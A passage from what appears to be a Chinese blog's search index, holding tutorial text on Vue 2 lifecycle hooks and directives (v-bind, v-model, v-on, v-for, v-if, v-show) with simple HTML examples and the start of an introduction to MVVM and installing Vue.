实例化时调用，也可以将它理解为初始化函数比较方便一点，在 Vue 1.0 版本时，这个函数的名字就是 init created：在创建 Vue 实例之后进行调用 beforeMount：页面加载完成，没有渲染，例如此时页面还是会显示类似 {{name}} 的内容 mounted：可以将它理解为原生 JS 中的 window.onload=function(){}，或许也可以理解为 JQuery 中的 $(document).ready(function(){})，它就是在 DOM 文档渲染完毕之后将要执行的函数，该函数在 Vue 1.0 版本中名字为 compiled，此时页面中的 {{name}} 已被渲染成 张三 beforeDestroy：该函数将在销毁实例前进行调用 destroyed：该函数将在销毁实例后进行调用 beforeUpdate：该函数将在组件更新之前调用 updated：该函数将在组件更新之后调用 钩子函数使用12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;span id="num"&gt;{{num}}&lt;/span&gt; &lt;button v-on:click="num++"&gt;点赞&lt;/button&gt; &lt;h2&gt; {{name}}，有 {{num}} 个人点赞。 &lt;/h2&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { name: "张三", num: 10 }, methods: { show() { return this.name; }, add() { this.num++; } }, beforeCreate() { console.log("=========beforeCreate============="); console.log("数据模型未加载: " + this.name, this.num); console.log("方法未加载: " + this.show); console.log("html 模板未加载: " + document.getElementById("num")); }, created: function () { console.log("=========created============="); console.log("数据模型已加载: " + this.name, this.num); console.log("方法已加载: " + this.show()); console.log("html 模板已加载: " + document.getElementById("num")); console.log("html 模板未渲染: " + document.getElementById("num").innerText); }, beforeMount() { console.log("=========beforeMount============="); console.log("html 模板未渲染: " + document.getElementById("num").innerText); }, mounted() { console.log("=========mounted============="); console.log("html 模板已渲染: " + document.getElementById("num").innerText); }, beforeUpdate() { console.log("=========beforeUpdate============="); console.log("数据模型已更新: " + this.num); console.log("html 模板未更新: " + document.getElementById("num").innerText); }, updated() { console.log("=========updated============="); console.log("数据模型已更新: " + this.num); console.log("html 模板已更新: " + document.getElementById("num").innerText); } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码运行效果 上述 HTML 代码运行后，浏览器控制台的日志输出如下，在页面中每点赞一次，都会记录显示点赞的总次数。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端"},{title:"初探前端框架 Vue2 之二",url:"/posts/919c7e37.html",text:'大纲 初探前端框架 Vue2 之一 初探前端框架 Vue2 之二 初探前端框架 Vue2 之三 初探前端框架 Vue2 之四 Vue 指令介绍什么是指令 指令（Directives）是带有 v- 前缀的特殊特性 指令特性的预期值是：单个 JavaScript 表达式 指令的职责是，当表达式的值改变时，将其产生的连带影响，响应式地作用于 DOM（视图）。 插值表达式花括号 格式：{{表达式}} 描述： 花括号 {{ }} 只能写在 HTML 的标签体内 表达式支持 JS 语法，可以调用 JS 内置函数（必须有返回值） 表达式必须有返回结果，例如 1 + 1，没有结果的表达式不允许使用，例如 let a = 1 + 1 是不合法的表达式 可以直接指定 Vue 实例中定义的数据或函数 插值闪烁使用 {{ }} 方式在网速较慢时会出现问题。在数据未加载完成时，页面会显示出原始的 {{ }} 内容，页面加载完毕后才会显示正确的数据，该现象称为 插值闪烁。Chrome 浏览器可以将网速调慢一些（如下图），然后刷新页面，这样就可以重现 插值闪烁 现象。 v-text 和 v-html 指令为了解决 插值闪烁 的问题，可以使用 v-text 和 v-html 指令来替代 {{ }} v-text：将数据输出到标签内部，如果输出的数据有 HTML 代码，会作为普通文本输出 v-html：将数据输出到标签内部，如果输出的数据有 HTML 代码，会被渲染后再输出 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;span v-html="code"&gt;&lt;/span&gt; &lt;br&gt; &lt;span v-text="code"&gt;&lt;/span&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { code: "&lt;h1&gt;Hello World&lt;/h1&gt;" } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码运行效果 上述 HTML 代码运行后的效果如下，即使是网速较低的时候，也不会出现插值闪烁现象；当没有数据时，会显示空白或者默认数据。 v-bind 指令HTML 标签的属性不能使用花括号 {{ }} 的形式来绑定，但可以使用 v-bind 指令给 HTML 标签的属性绑定值；而且在将 v-bind 指令用于 class 和 style 时，Vue 做了专门的增强。 绑定 class使用 v-bind 指令绑定 HTML 标签的 class。 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;span v-bind:class="{\'active\': isActive, \'text-danger\': hasError}"&gt;Hello World&lt;/span&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { isActive: true, hasError: true } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 绑定 style使用 v-bind 指令绑定 HTML 标签的 style。 1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;span v-bind:style="{\'color\': fontColor, \'font-size\': fontSize}"&gt;Hello Vue&lt;/span&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { fontColor: \'red\', fontSize: \'30px\' } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 绑定 attribute使用 v-bind 指令绑定 HTML 标签的 attribute（属性）。 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;a v-bind:href="link"&gt;Baidu&lt;/a&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { link: \'https://www.baidu.com\' } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 绑定其他任意属性使用 v-bind 指令绑定 HTML 标签的其他任意属性。 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;span v-bind:user="userName"&gt;Hello World&lt;/span&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { userName: \'Jack\' } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; v-bind 指令支持缩写v-bind 指令支持缩写，例如 v-bind:href 可以缩写为 :href。 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;a :href="link"&gt;Baidu&lt;/a&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { link: \'https://www.baidu.com\' } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; v-model 指令v-model 指令介绍上述的 v-text、v-html、v-bind 可以看做是单向绑定，模型变化会引起视图变化（渲染），但是反过来就不行。而 v-model 指令是双向绑定，模型（Model）与视图（View）之间会互相影响。既然是双向绑定，一定是在视图中可以修改数据，这样就限定了视图的 HTML 标签类型。目前 v-model 的可使用标签有： radio：单选框 checkbox：多选框 select：下拉列表 input：单行输入框 textarea：多行文本输入框 components：Vue 中的自定义组件 基本上除了最后一项，其它都是表单的输入项。 v-model 指令使用12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;label&gt;精通的语言：&lt;/label&gt;&lt;br&gt; &lt;input type="checkbox" v-model="language" value="java"&gt; Java&lt;br&gt; &lt;input type="checkbox" v-model="language" value="php"&gt; PHP&lt;br&gt; &lt;input type="checkbox" v-model="language" value="c++"&gt; C++&lt;br&gt; &lt;input type="checkbox" v-model="language" value="golang"&gt; Golang&lt;br&gt; &lt;label&gt;选中的语言：&lt;/label&gt;&lt;br&gt; {{language.join(\' , \')}} &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { language: [] } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 多个 checkBox 对应一个 Model 时，Model 的类型是一个数组；单个 checkbox 时，Model 的类型是 boolean select 单选对应的值是字符串类型，多选对应的值是数组类型 radio 对应的值是 input 标签的 value 值 text 和 textarea 对应值是字符串类型 代码运行效果 使用 v-model 指令，上述 HTML 代码运行后的效果如下： v-on 指令v-on 指令介绍v-on 指令用于给页面标签绑定事件（如点击事件）。 v-on 指令中可以写 JS 片段，也可以指定在 Vue 实例中定义的函数名称，语法为：v-on:事件名="JS 片段或函数名称" v-on 指令支持缩写，v-on:click=\'add\' 可以缩写为 @click=\'add\' v-on 指令使用12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;button v-on:click="number++"&gt;点赞&lt;/button&gt; &lt;button @click="cancel"&gt;取消点赞&lt;/button&gt; &lt;h2&gt;有 {{number}} 个人点赞&lt;/h2&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: \'#app\', data: { number: 0 }, methods: { cancel() { if (this.number &gt; 0) { this.number--; } } } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; v-on 指令的事件修饰符事件修饰符介绍为了阻止事件冒泡，在事件处理的代码中调用 event.preventDefault() 或 event.stopPropagation() 是非常常见的需求。尽管可以在函数中轻松实现这一点，但更好的方式是让函数只拥有纯粹的数据逻辑，而不是去处理 DOM 事件细节。为了解决这个问题，Vue 为 v-on 指令提供了事件修饰符，而修饰符是由点开头的指令后缀来表示。 .stop：阻止事件冒泡到父标签 .prevent：阻止默认事件发生 .capture：使用事件捕获模式 .self：只有标签自身触发事件才执行（冒泡或捕获的都不执行） .once：只执行一次 事件修饰符使用123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;div style="border: 1px solid red; padding: 20px;" v-on:click="hello"&gt; 大的 Div &lt;!-- 阻止事件冒泡 --&gt; &lt;div style="border: 1px solid blue; padding: 20px;" v-on:click.stop="hello"&gt; 小的 Div&lt;br /&gt; &lt;!-- 阻止默认事件和事件冒泡 --&gt; &lt;a href="http://www.baidu.com" v-on:click.prevent.stop="hello"&gt;跳转百度&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: \'#app\', data: { number: 0 }, methods: { hello() { console.log("点击了"); } } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; v-on 指令的按键修饰符按键修饰符介绍在监听键盘事件时，往往需要检查常见的键值。Vue 允许为 v-on 指令在监听键盘事件时添加按键修饰符： 12&lt;!-- 只有在 `keyCode` 是 13 时才调用 `submit()` --&gt;&lt;input v-on:keyup.13="submit"&gt; 由于记住所有的 keyCode 比较困难，所以 Vue 为最常用的按键提供了别名： 12345&lt;!-- 只有在按下回车键时才调用 `submit()` --&gt;&lt;input v-on:keyup.enter="submit"&gt;&lt;!-- 缩写的语法 --&gt;&lt;input @keyup.enter="submit"&gt; 全部的按键别名如下： .enter .tab .delete（捕获” 删除” 和” 退格” 键） .esc .space .up .down .left .right 按键修饰符使用1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;span&gt;输入数字：&lt;/span&gt;&lt;input text="text" v-model="number" v-on:keyup.up="number+=2" v-on:keyup.down="number-=2"&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: \'#app\', data: { number: 0 } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 组合按键的使用可以用如下修饰符来实现仅在按下相应按键时，才触发鼠标或键盘事件的监听器。 .ctrl .alt .shift 12345&lt;!-- Alt + C --&gt;&lt;input v-on:keyup.alt.67="clear"&gt;&lt;!-- Ctrl + Click --&gt;&lt;div v-on:click.ctrl="doSomething"&gt;Do something&lt;/div&gt; v-for 指令v-for 指令介绍通过遍历数据来渲染页面是非常常见的需求，在 Vue 中可以通过 v-for 指令来实现。 v-for 指令使用遍历数组语法：v-for="item in items" items：要遍历的数组，需要在 Vue 实例的 data 中定义好 item：迭代得到的当前正在遍历的元素 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;ul&gt; &lt;li v-for="user in users"&gt; {{user.name}} - {{user.gender}} - {{user.age}} &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { users: [ { name: \'柳岩\', gender: \'女\', age: 23 }, { name: \'刘亦菲\', gender: \'女\', age: 28 }, { name: \'古力娜扎\', gender: \'女\', age: 26 } ] } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码运行效果 上述 HTML 代码的运行效果如下： 数组下标若希望在遍历数组时，获取当前数组元素的下标，可以指定第二个参数。 语法：v-for="(item, index) in items" items：要遍历的数组，需要在 Vue 实例的 data 中定义好 item：迭代得到的当前正在遍历的元素 index：迭代到的当前元素的索引，从 0 开始 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;ul&gt; &lt;li v-for="(user, index) in users"&gt; 第 {{index+1}} 个女明星: {{user.name}} - {{user.gender}} - {{user.age}} &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { users: [ { name: \'柳岩\', gender: \'女\', age: 23 }, { name: \'刘亦菲\', gender: \'女\', age: 28 }, { name: \'古力娜扎\', gender: \'女\', age: 26 } ] } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码运行效果 上述 HTML 代码的运行效果如下： 遍历对象v-for 指令除了可以迭代数组，还可以迭代对象。语法如下： v-for="value in object"，得到的是对象的属性值 v-for="(value, key) in object"，得到的第一个是对象的属性值，第二个是对象的属性名 v-for="(value, key, index) in object"，得到的第一个是对象的属性值，第二个是对象的属性名，第三个是索引（从 0 开始） 1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;ul&gt; &lt;li v-for="(value, key, index) in user"&gt; 第 {{index+1}} 个属性: {{key}} - {{value}} &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { user: { name: \'柳岩\', gender: \'女\', age: 23 } } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码运行效果 上述 HTML 代码的运行效果如下： 遍历优化遍历数据时，建议都加上 v-bind:key 指令来区分不同的数据（标识每一个元素的唯一特征），这样 Vue 就可以使用” 就地复用” 策略有效地提高渲染效率。 12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;ul&gt; &lt;!-- 使用 v-bind 指令指定 key --&gt; &lt;li v-for="user in users" v-bind:key="user.id"&gt; {{user.name}} - {{user.gender}} - {{user.age}} &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { users: [ { id: 1, name: \'柳岩\', gender: \'女\', age: 23 }, { id: 2, name: \'刘亦菲\', gender: \'女\', age: 28 }, { id: 3, name: \'古力娜扎\', gender: \'女\', age: 26 } ] } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 若遍历的数据（数组或者对象）没法通过唯一标识来区分时，可以直接使用 index 索引来作为 key。 12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;ul&gt; &lt;!-- 使用 v-bind 指令指定 key --&gt; &lt;li v-for="(user, index) in users" v-bind:key="index"&gt; {{user.name}} - {{user.gender}} - {{user.age}} &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { users: [ { name: \'柳岩\', gender: \'女\', age: 23 }, { name: \'刘亦菲\', gender: \'女\', age: 28 }, { name: \'古力娜扎\', gender: \'女\', age: 26 } ] } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 最佳实践 如果 items 是普通数组，可以使用 index 作为每个元素的唯一标识 如果 items 是对象数组，可以使用 item.id 作为每个元素的唯一标识 v-if 指令v-if 指令介绍v-if 指令，用于条件判断。当得到结果为 true 时，所在的标签才会被渲染。 v-if 指令使用1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;button v-on:click="show = !show"&gt;切换显示模式&lt;/button&gt; &lt;h1 v-if="show"&gt;Hello World&lt;/h1&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { show: true } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 与 v-for 结合使用当 v-if 和 v-for 指令同时使用时，v-for 指令的优先级更高。也就是说，Vue 会先遍历数据，然后再判断条件。 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;ul&gt; &lt;li v-for="(user, index) in users" v-if="user.gender == \'女\'"&gt; 第 {{index+1}} 个明星: {{user.name}} - {{user.gender}} - {{user.age}} &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { users: [ { name: \'柳岩\', gender: \'女\', age: 23 }, { name: \'刘亦菲\', gender: \'女\', age: 28 }, { name: \'刘德华\', gender: \'男\', age: 60 } ] } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码运行效果 上述 HTML 代码的运行效果如下： v-show 指令v-show 指令介绍v-show 指令，也用于条件判断，当得到结果为 true 时，所在的标签才会被显示。v-show 与 v-if 指令不同的地方在于，当结果为 false 时，v-show 指令是通过添加 CSS 样式 style="display: none" 来隐藏标签内容的。 v-show 指令使用1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;button v-on:click="show = !show"&gt;切换显示模式&lt;/button&gt; &lt;h1 v-show="show"&gt;Hello World&lt;/h1&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { show: true } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; v-else 与 v-else-if 指令v-else 指令必须紧跟在带 v-if 或者 v-else-if 指令的标签的后面，否则它将不会被识别。 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;button v-on:click="random = Math.random()"&gt;生成随机数&lt;/button&gt; &lt;p&gt;&lt;/p&gt; &lt;h3&gt;{{random}}&lt;/h3&gt; &lt;h2 v-if="random &gt;= 0.75"&gt; &amp;gt;= 0.75 &lt;/h2&gt; &lt;h2 v-else-if="random &gt;= 0.5"&gt; &amp;gt;= 0.5 &lt;/h2&gt; &lt;h2 v-else-if="random &gt;= 0.2"&gt; &amp;gt;= 0.2 &lt;/h2&gt; &lt;h2 v-else&gt; &amp;lt; 0.2 &lt;/h2&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; let app = new Vue({ el: "#app", data: { random: 1 } }) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码运行效果 上述 HTML 代码的运行效果如下： var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端"},{title:"初探前端框架 Vue2 之一",url:"/posts/7da7d638.html",text:'大纲 初探前端框架 Vue2 之一 初探前端框架 Vue2 之二 初探前端框架 Vue2 之三 初探前端框架 Vue2 之四 前言MVVM 思想 M：即 Model（模型），包括数据和一些基本操作 V：即 View（视图），页面的渲染结果 VM：即 View-Model，模型与视图间的双向操作（无需开发人员干涉） 在 MVVM 之前，开发人员从后端获取需要的数据模型，然后要通过 DOM 操作 Model 渲染到 View 中。当用户操作视图后，开发人员还需要通过 DOM 获取 View 中的数据，然后同步到 Model 中。而 MVVM 中的 VM 要做的事情就是把 DOM 操作完全封装起来，开发人员不用再关心 Model 和 View 之间是如何互相影响的。这样可以将开发人员从繁琐的 DOM 操作中解放出来，把关注点放在如何操作 Model 上。 一旦 Model 发生了改变，View 上自然就会呈现出来 当用户修改了 View，Model 中的数据也会跟着改变 Vue 简介Vue (读音 /vjuː/，类似于 view) 是一套用于构建用户界面的渐进式框架。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与现代化的工具链以及各种支持类库结合使用时，Vue 也完全能够为复杂的单页应用提供驱动。更多的 Vue 介绍可参考 Vue v2 中文官网、Vue GitHub 项目。 Vue 安装Script 方式安装可以直接下载 Vue 的 JS 文件，然后使用 &lt;script&gt; 标签引入，Vue 会被注册为一个全局变量。 CDN 方式安装12345&lt;!-- 开发环境 --&gt;&lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt;&lt;!-- 生产环境 --&gt;&lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10"&gt;&lt;/script&gt; 若使用了原生 ES Modules，这里也有一个兼容 ES Module 的构建文件： 123&lt;script type="module"&gt; import Vue from 